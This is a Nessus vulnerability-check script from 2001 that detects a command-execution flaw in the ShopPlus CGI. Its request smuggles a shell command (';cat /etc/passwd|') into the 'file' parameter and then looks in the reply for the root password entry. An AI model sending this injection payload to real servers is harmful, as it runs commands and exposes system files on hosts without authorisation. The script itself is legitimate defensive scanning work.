#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10774); 
script_cve_id("CAN-2001-0992");
 script_version ("$Revision: 1.11 $");

 name["english"] = "ShopPlus Arbitrary Command Execution";
 script_name(english:name["english"]);

 desc["english"] = "
The ShopPlus CGI is installed. Some versions of this CGI suffer from a 
vulnerability that allows execution of arbitrary commands with the security 
privileges of the web server.

Solution: 
Upgrade to the latest version available by contacting the author of the program.

Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/5PP021P5FK.html
";

 script_description(english:desc["english"]);

 summary["english"] = "ShopPlus Arbitrary Command Execution";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

# Converts www.honlolo.hostname.com to hostname.com
function reverse_remove(in_string)
{
 finished = 1;
 first = 1;

 #display("in_string: ", in_string, "\n");
 _ret = "";
 for (count = strlen(in_string)-1; finished;)
 {
  #display("count: ", count, "\n");
  #display("in_string[count]: ", in_string[count], "\n");
  if (in_string[count] == string("."))
  {
   if (first)
   {
    first = 0;
#    display("First\n");
   }
   else
   {
    finished = 0;
   }
  }

  if (finished) _ret = string(in_string[count], _ret);

  if (count > 0)
  {
   count = count - 1;
  }
  else
  {
   finished = 0;
  }

 }

 return (_ret);
}


port = get_kb_item("Services/www");
if (!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
url = string(dir, "/shopplus.cgi");
if (is_cgi_installed_ka(item:url, port:port))
  {
   hostname = get_host_name();
   fixed_hostname = reverse_remove(in_string:hostname);
   url = string(dir, "/shopplus.cgi?dn=", fixed_hostname, "&cartid=%CARTID%&file=;cat%20/etc/passwd|");
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if( buf == NULL ) exit(0);
   if (egrep(pattern:"root:.*:0:.*", string:buf))
    {
     security_hole(port:port);
     exit(0);
    }
  }
}

